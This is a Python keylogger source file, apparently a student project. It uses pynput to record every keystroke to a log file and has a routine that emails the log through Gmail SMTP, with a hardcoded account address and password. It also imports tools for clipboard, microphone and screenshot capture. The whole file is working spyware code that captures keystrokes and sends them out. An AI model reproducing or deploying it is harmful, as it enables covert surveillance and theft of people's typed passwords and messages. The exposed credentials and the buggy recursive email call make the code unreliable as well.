# Libraries
# emails libraries to email features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# default modules for collecting computer information
import socket
import platform

import win32clipboard

# to grab keystrokes (key logs the key and listener listens for each key typed on the keyboard)
from pynput.keyboard import Key, Listener

# module to track the time
import time
import os

# modules for microphone capabilities
from scipy.io.wavfile import write
import sounddevice as sd

# module to encrypt files
from cryptography.fernet import Fernet

# to get username and to get more computer information
import getpass
from requests import get

# module to add screenshot functionality/ to only take one screenshot at a time
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# default variables
keys_information = "key_log.txt"  # where all the key that are logged going to be appended to
email_address = "collegepjct@gmail.com" # email we are going to be send from
password = "Pr&c!s@Mud4r"

toaddr = "collegepjct@gmail.com"

file_path = "D:\\NCI\\Semester_3\\Project\\Keylogger\\Test2\\Project"  # file path where the key_log.txt will be store
extend = "\\"

# email controls/functionality - send the keystrokes to email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    # create a message (Multi internet mail extensions) allowing to format email msg to support character, text and attachments
    msg = MIMEMultipart()

    msg['From'] = fromaddr # define the sending address
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    # encode the message
    p.set_payload(attachment.read()) #read the attachment

    encoders.encode_base64(p) # finish encode

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) # add header to the msg

    msg.attach(p) # attach the msg

    # create SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() # start TLS session

    s.login(fromaddr, password) # login to the email

    text = msg.as_string() # convert the MIME msg  into string

    s.sendmail(fromaddr, toaddr, text) # send email
    s.quit()

    send_email(keys_information, file_path + extend + keys_information, toaddr)

# constant variable
count = 0
keys = []  # where each key will be appended to the list


def on_press(key):
    global keys, count

    print(key)  # output each key that is typed on to the screen
    keys.append(key)  # append each key to a empty list
    count += 1  # increase the key count by one

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# write the keys to the key_log.txt file
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:  # open the file, to start append data to the file
        for key in keys:  # loop through each of keys with keys the list that have been appended (checking for modifications)
            k = str(key).replace("'", "")  # replace single quote for nothing (blank)

            # make it each word readable on a different line (if the space bar is typed and is greater than 0 it create a new line
            if k.find("space") > 0:
                f.write('\n')
                f.close()

            # check the value of each key and write the key to the file
            elif k.find("key") == -1:
                f.write(k)
                f.close()


# to exit of the keylogger
def on_release(key):
    if key == Key.esc:
        return False


# to listens for each key and implement on_press, write_file and on_release functions
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()